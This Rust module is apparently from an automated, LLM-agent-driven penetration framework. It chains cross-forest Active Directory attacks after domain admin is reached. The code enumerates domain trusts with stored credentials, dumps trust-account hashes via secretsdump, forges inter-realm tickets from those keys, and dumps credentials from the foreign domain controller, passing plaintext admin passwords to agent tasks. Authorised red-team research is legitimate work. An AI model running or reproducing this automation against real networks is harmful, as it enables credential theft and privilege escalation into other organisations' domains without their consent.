//! auto_trust_follow -- trust enumeration, key extraction, and cross-domain attacks.
//!
//! Three-phase automation:
//!
//! 1. **Trust enumeration**: When DA is achieved, dispatch `enumerate_domain_trusts`
//!    to discover trust relationships via LDAP.
//! 2. **Trust key extraction**: When trusts are known and DA creds are available,
//!    dispatch secretsdump for trust account hashes (e.g. `FABRIKAM$`).
//! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
//!    ticket creation and secretsdump against the foreign DC.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Monitors for trust account hashes and dispatches cross-domain attacks.
/// Interval: 30s.
pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Auto-enumerate trusts when DA is achieved
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin {
                // Dispatch trust enumeration for each known DC (once per domain)
                let enum_work: Vec<(String, String, String)> = state
                    .domain_controllers
                    .iter()
                    .filter(|(domain, _)| {
                        let key = format!("trust_enum:{}", domain.to_lowercase());
                        !state.is_processed(DEDUP_TRUST_FOLLOW, &key)
                    })
                    .map(|(domain, dc_ip)| {
                        let key = format!("trust_enum:{}", domain.to_lowercase());
                        (key, domain.clone(), dc_ip.clone())
                    })
                    .collect();
                drop(state);

                for (key, domain, dc_ip) in enum_work {
                    // Find a credential for this domain
                    let cred = {
                        let s = dispatcher.state.read().await;
                        s.credentials
                            .iter()
                            .find(|c| {
                                !c.password.is_empty()
                                    && (c.domain.to_lowercase() == domain.to_lowercase()
                                        || domain
                                            .to_lowercase()
                                            .ends_with(&format!(".{}", c.domain.to_lowercase())))
                            })
                            .cloned()
                    };

                    if let Some(cred) = cred {
                        let payload = json!({
                            "techniques": ["enumerate_domain_trusts"],
                            "target_ip": dc_ip,
                            "domain": domain,
                            "credential": {
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            },
                        });

                        match dispatcher
                            .throttled_submit("recon", "recon", payload, 3)
                            .await
                        {
                            Ok(Some(task_id)) => {
                                info!(
                                    task_id = %task_id,
                                    domain = %domain,
                                    "Trust enumeration dispatched"
                                );
                                dispatcher
                                    .state
                                    .write()
                                    .await
                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                                let _ = dispatcher
                                    .state
                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                    .await;
                            }
                            Ok(None) => {}
                            Err(e) => warn!(err = %e, "Failed to dispatch trust enumeration"),
                        }
                    }
                }
            }
        }

        // Extract trust keys for known cross-forest trusts
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin && !state.trusted_domains.is_empty() {
                let extract_work: Vec<(String, String, String, String)> = state
                    .trusted_domains
                    .values()
                    .filter(|trust| trust.is_cross_forest())
                    .filter_map(|trust| {
                        let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            return None;
                        }
                        // Find a DC in the source domain (our domain, not the trust target)
                        // The trust domain is the foreign one; we need to secretsdump our DC
                        let source_domain = state.domains.first()?;
                        let dc_ip = state
                            .domain_controllers
                            .get(&source_domain.to_lowercase())
                            .cloned()?;
                        Some((key, trust.flat_name.clone(), trust.domain.clone(), dc_ip))
                    })
                    .collect();
                let admin_cred = state
                    .credentials
                    .iter()
                    .find(|c| c.is_admin && !c.password.is_empty())
                    .cloned();
                drop(state);

                if let Some(cred) = admin_cred {
                    for (key, flat_name, trust_domain, dc_ip) in extract_work {
                        // secretsdump -just-dc-user FABRIKAM$ to get trust key
                        let trust_account = format!("{}$", flat_name.to_uppercase());
                        let payload = json!({
                            "technique": "secretsdump",
                            "target_ip": dc_ip,
                            "domain": cred.domain,
                            "just_dc_user": trust_account,
                            "credential": {
                                "username": cred.username,
                                "password": cred.password,
                                "domain": cred.domain,
                            },
                            "reason": format!("extract trust key for {}", trust_domain),
                        });

                        match dispatcher
                            .throttled_submit("credential_access", "credential_access", payload, 2)
                            .await
                        {
                            Ok(Some(task_id)) => {
                                info!(
                                    task_id = %task_id,
                                    trust_account = %trust_account,
                                    trust_domain = %trust_domain,
                                    "Trust key extraction dispatched"
                                );
                                dispatcher
                                    .state
                                    .write()
                                    .await
                                    .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                                let _ = dispatcher
                                    .state
                                    .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                                    .await;
                            }
                            Ok(None) => {}
                            Err(e) => {
                                warn!(err = %e, "Failed to dispatch trust key extraction")
                            }
                        }
                    }
                }
            }
        }

        // Follow trust keys (inter-realm ticket + foreign secretsdump)
        let (work, admin_cred_phase3): (
            Vec<TrustFollowWork>,
            Option<ares_core::models::Credential>,
        ) = {
            let state = dispatcher.state.read().await;

            // Skip if no domain admin yet — trust extraction requires DA-level creds
            if !state.has_domain_admin {
                continue;
            }

            // Build lookup of known trust flat names → TrustInfo so we only
            // process actual trust account hashes, not random machine accounts.
            let trust_by_flat: std::collections::HashMap<String, &ares_core::models::TrustInfo> =
                state
                    .trusted_domains
                    .values()
                    .map(|t| (t.flat_name.to_uppercase(), t))
                    .collect();

            let admin_cred = state
                .credentials
                .iter()
                .find(|c| c.is_admin && !c.password.is_empty())
                .cloned();

            let items = state
                .hashes
                .iter()
                .filter_map(|hash| {
                    if !hash.username.ends_with('$') {
                        return None;
                    }

                    // Only process hashes that match a known trust account
                    let netbios = hash.username.trim_end_matches('$').to_uppercase();
                    let trust = trust_by_flat.get(&netbios)?;

                    // Resolve source domain — fall back to first known domain
                    // when secretsdump output lacks domain prefix for machine accounts
                    let source_domain = if hash.domain.is_empty() {
                        state.domains.first().cloned().unwrap_or_default()
                    } else {
                        hash.domain.clone()
                    };
                    if source_domain.is_empty() {
                        return None;
                    }

                    let dedup_key = format!(
                        "trust_follow:{}:{}",
                        source_domain.to_lowercase(),
                        hash.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                        return None;
                    }

                    // Use the FQDN from the trust relationship — never fall back
                    // to bare NetBIOS name which produces invalid domain strings.
                    let target_domain = trust.domain.clone();

                    let target_dc_ip = state
                        .domain_controllers
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    let source_domain_sid = state
                        .domain_sids
                        .get(&source_domain.to_lowercase())
                        .cloned();
                    let target_domain_sid = state
                        .domain_sids
                        .get(&target_domain.to_lowercase())
                        .cloned();

                    let source_dc_ip = state
                        .domain_controllers
                        .get(&source_domain.to_lowercase())
                        .cloned();

                    Some(TrustFollowWork {
                        dedup_key,
                        hash: hash.clone(),
                        source_domain,
                        target_domain,
                        target_dc_ip,
                        source_domain_sid,
                        target_domain_sid,
                        source_dc_ip,
                    })
                })
                .collect();

            (items, admin_cred)
        };

        for item in work {
            let vuln_id = format!(
                "forest_trust_{}_{}",
                item.source_domain.to_lowercase(),
                item.target_domain.to_lowercase()
            );
            let trust_target = item
                .target_dc_ip
                .clone()
                .unwrap_or_else(|| item.target_domain.clone());
            {
                let mut details = std::collections::HashMap::new();
                details.insert(
                    "source_domain".into(),
                    serde_json::Value::String(item.source_domain.clone()),
                );
                details.insert(
                    "target_domain".into(),
                    serde_json::Value::String(item.target_domain.clone()),
                );
                details.insert(
                    "trust_account".into(),
                    serde_json::Value::String(item.hash.username.clone()),
                );
                details.insert(
                    "note".into(),
                    serde_json::Value::String(format!(
                        "Forest trust escalation via {} trust key — inter-realm ticket + secretsdump",
                        item.hash.username
                    )),
                );
                let vuln = ares_core::models::VulnerabilityInfo {
                    vuln_id: vuln_id.clone(),
                    vuln_type: "forest_trust_escalation".to_string(),
                    target: trust_target,
                    discovered_by: "trust_automation".to_string(),
                    discovered_at: chrono::Utc::now(),
                    details,
                    recommended_agent: String::new(),
                    priority: 1,
                };
                let _ = dispatcher
                    .state
                    .publish_vulnerability(&dispatcher.queue, vuln)
                    .await;
            }

            // 1. Dispatch inter-realm ticket creation.
            //    Use field names that match the tool and prompt expectations:
            //    - `vuln_type` routes to generate_trust_key_prompt
            //    - `source_sid`/`target_sid` match create_inter_realm_ticket tool
            //    - `trusted_domain` is read by the trust prompt
            //    - Include admin creds + dc_ip so the LLM can call get_sid if SIDs are missing
            let mut ticket_payload = json!({
                "technique": "create_inter_realm_ticket",
                "vuln_type": "cross_forest",
                "domain": item.source_domain,
                "trusted_domain": item.target_domain,
                "target_domain": item.target_domain,
                "target": item.target_dc_ip.as_deref().unwrap_or(&item.target_domain),
                "trust_key": item.hash.hash_value,
                "trust_account": item.hash.username,
                "vuln_id": &vuln_id,
            });
            if let Some(ref sid) = item.source_domain_sid {
                ticket_payload["source_sid"] = json!(sid);
            }
            if let Some(ref sid) = item.target_domain_sid {
                ticket_payload["target_sid"] = json!(sid);
            }
            if let Some(ref aes) = item.hash.aes_key {
                ticket_payload["aes_key"] = json!(aes);
            }
            if let Some(ref dc_ip) = item.source_dc_ip {
                ticket_payload["dc_ip"] = json!(dc_ip);
            }
            if let Some(ref cred) = admin_cred_phase3 {
                ticket_payload["username"] = json!(cred.username);
                ticket_payload["password"] = json!(cred.password);
            }

            match dispatcher
                .throttled_submit("exploit", "privesc", ticket_payload, 1)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        trust_account = %item.hash.username,
                        source_domain = %item.source_domain,
                        target_domain = %item.target_domain,
                        has_source_sid = item.source_domain_sid.is_some(),
                        has_target_sid = item.target_domain_sid.is_some(),
                        "Inter-realm ticket task dispatched"
                    );
                    let _ = dispatcher
                        .state
                        .mark_exploited(&dispatcher.queue, &vuln_id)
                        .await;
                }
                Ok(None) => {
                    debug!("Inter-realm ticket deferred by throttler");
                    continue;
                }
                Err(e) => {
                    warn!(err = %e, "Failed to dispatch inter-realm ticket");
                    continue;
                }
            }

            // 2. If we know the target DC, dispatch secretsdump against it
            if let Some(ref dc_ip) = item.target_dc_ip {
                let sd_payload = json!({
                    "technique": "secretsdump",
                    "target_ip": dc_ip,
                    "domain": item.target_domain,
                    "trust_account": item.hash.username,
                    "trust_key": item.hash.hash_value,
                });

                match dispatcher
                    .throttled_submit("credential_access", "credential_access", sd_payload, 2)
                    .await
                {
                    Ok(Some(task_id)) => {
                        info!(
                            task_id = %task_id,
                            target_dc = %dc_ip,
                            target_domain = %item.target_domain,
                            "Cross-domain secretsdump dispatched"
                        );
                    }
                    Ok(None) => {}
                    Err(e) => warn!(err = %e, "Failed to dispatch cross-domain secretsdump"),
                }
            }

            // Mark as processed
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                .await;
        }
    }
}

struct TrustFollowWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    source_domain: String,
    target_domain: String,
    target_dc_ip: Option<String>,
    source_domain_sid: Option<String>,
    target_domain_sid: Option<String>,
    source_dc_ip: Option<String>,
}
